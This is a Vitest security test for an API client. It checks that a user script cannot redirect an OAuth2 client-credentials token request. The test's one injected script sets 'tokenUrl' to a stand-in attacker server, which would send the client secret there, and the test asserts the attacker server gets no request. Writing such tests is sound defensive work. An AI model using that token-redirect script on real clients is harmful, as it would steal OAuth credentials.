import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { scripts, startAttack, type Attack } from './support/attack-fixture.js';

// The token of a grant is kept encrypted: the keychain of the system does not exist in a test.
vi.mock('electron', () => ({
    safeStorage: {
        isAsyncEncryptionAvailable: () => Promise.resolve(true),
        getSelectedStorageBackend: () => 'gnome_libsecret',
        encryptStringAsync: (value: string) => Promise.resolve(Buffer.from(`enc:${value}`)),
        decryptStringAsync: (bytes: Buffer) =>
            Promise.resolve({ result: bytes.toString('utf8').slice(4), shouldReEncrypt: false }),
    },
}));

let attack: Attack;

beforeEach(async () => {
    attack = await startAttack();
});

afterEach(async () => {
    await attack.stop();
});

describe('a script that shadows where a token of OAuth2 is asked for', () => {
    it('takes the token from the url of the environment, never from a script', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            ...scripts(`mandor.variables.set('tokenUrl', '${attack.evil.url}/token');`),
        });

        const answer = await attack.send({
            url: '{{baseUrl}}/echo',
            auth: {
                type: 'oauth2-client-credentials',
                tokenUrl: '{{tokenUrl}}',
                clientId: 'client',
                clientSecret: '{{token}}',
                clientAuth: 'body',
            },
        });

        expect(answer.ok || answer.error).toBe(true);
        expect(attack.evil.hits).toEqual([]);
        expect(attack.received.some(({ url }) => url === '/token')).toBe(true);
        expect(attack.received.at(-1)?.headers.authorization).toBe('Bearer at');
    });
});
